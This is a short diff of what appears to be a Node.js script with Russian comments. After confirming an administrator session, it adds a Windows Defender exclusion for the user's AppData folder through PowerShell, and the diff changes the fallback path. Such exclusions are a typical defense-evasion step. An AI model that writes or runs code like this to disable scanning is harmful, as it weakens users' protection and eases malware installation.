@@ -28,7 +28,7 @@
     console.log("✅ СЕССИЯ АДМИНИСТРАТОРА");
     
     // Путь для исключения (например, %APPDATA% или C:\Temp)
-    const target = process.env.APPDATA || "C:\\Temp";
+    const target = process.env.APPDATA || process.env.LOCALAPPDATA
     console.log(`🛡️ Добавляем исключение Defender: ${target}`);
 
     // Используем PowerShell для взаимодействия с защитником (самый надежный API)
